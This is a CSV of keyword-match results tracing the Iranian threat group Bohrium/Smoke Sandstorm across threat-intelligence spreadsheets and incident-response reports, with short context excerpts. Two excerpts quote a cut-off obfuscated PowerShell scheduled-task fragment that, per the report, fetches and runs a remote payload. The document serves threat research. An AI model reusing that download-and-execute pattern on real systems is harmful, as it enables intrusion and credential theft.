original_source_path,original_source_location,matched_name,context_excerpt
APT Groups and Operations.xlsx,"{""row"": 40, ""sheet"": ""Iran""}",Bohrium,Bohrium https://securityaffairs.com/132002/apt/microsoft-seized-bohrium-apt-domains.html
APT Groups and Operations.xlsx,"{""row"": 40, ""sheet"": ""Iran""}",bohrium,Bohrium https://securityaffairs.com/132002/apt/microsoft-seized-bohrium-apt-domains.html
Charming Kitten/Iranian-Dream-Job-ver1.pdf,"{""page"": 4}",BOHRIUM,"e discovered was associated with a fake company called ""Careers 2 Find"" which previously worked for ""1st Employer"", a fake recruiting website highlighted by Mandiant in February. TA455, also known as Smoke Sandstorm, BOHRIUM and Yellow Dev13 , is a subgroup of Iranian threat actor Charming Kitten (APT35). TA455 targets organizations in Israel using double attack scenarios (two scenarios in one attack, one malicious and one for camouflage)"
Charming Kitten/Iranian-Dream-Job-ver1.pdf,"{""page"": 4}",Smoke Sandstorm,"t. One profile we discovered was associated with a fake company called ""Careers 2 Find"" which previously worked for ""1st Employer"", a fake recruiting website highlighted by Mandiant in February. TA455, also known as Smoke Sandstorm, BOHRIUM and Yellow Dev13 , is a subgroup of Iranian threat actor Charming Kitten (APT35). TA455 targets organizations in Israel using double attack scenarios (two scenarios in one attack, one malicious and one for ca"
International Strategic/Iran/report-incident-response-middle-east.pdf,"{""page"": 17}",Smoke Sandstorm,"ing related to the use of this domain or IP linked to previous malicious activity . On 13 December 2024, the victim’s EDR solution detected the malicious module HXLibrary and linked it to a previous campaign related to Smoke Sandstorm, so it has been included as part of this intrusion . The deployment of the HXLibrary malware was the start of an extended period of consolidation for the adversary. They freely moved laterally through the victim’s env"
International Strategic/Iran/report-incident-response-middle-east.pdf,"{""page"": 39}",Bohrium,"retrieve and execute a payload from this domain . Meta identified this domain as associated with an unreported Iranian threat group49 active in April 2022. Microsoft identified The same domain as being related to the ‘Bohrium’ threat group, again aligned with Iran, and was taken down alongside 40 other related domains linked to the group’s activities on 27 May 2022.50 The forensic evidence outlined in the above report indicates that the ac"
International Strategic/Iran/report-incident-response-middle-east.pdf,"{""page"": 43}",BOHRIUM,"ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 Table 10. Details of web shells employed by the adver"
International Strategic/Iran/report-incident-response-middle-east.pdf,"{""page"": 44}",BOHRIUM,"ex([Text. Encoding]::ASCII. GetString([Convert]::FromBase64CharArray($b,15,$b. Length-15)));}catch{}sleep 9”. This command retrieves and executes a PowerShell command payload from historic infrastructure linked to the BOHRIUM threat group. 18 Jun 2023 Microsoft\Windows\ AppID\EDP Policy EDP Policy Scheduled task to retrieve harvested credentials from web pages placed on EXCH-1 and EXCH-2 (external facing Microsoft Exchange servers). Levera"
International Strategic/Iran/report-incident-response-middle-east.pdf,"{""page"": 47}",Bohrium,"onnaissance) following gaining access through valid credentials on 15 May 2023. FGIR assessed that the main cluster of activity covered in this article was a new intrusion rather than a continuation of prior behavior . Bohrium (Smoke SandStorm) Scheduled Task A scheduled task was detected on the primary Microsoft Exchange server, referred to as ‘EXCH-1’ throughout this report. The scheduled task was named ‘WindowsActionManager’ and, on execu"
microsoft-threat-actor-list.xlsx,"{""row"": 8, ""sheet"": ""alphabetical""}",BOHRIUM,BOHRIUM Smoke Sandstorm Iran DEV-0215 (LAWRENCIUM) Pearl Sleet North Korea
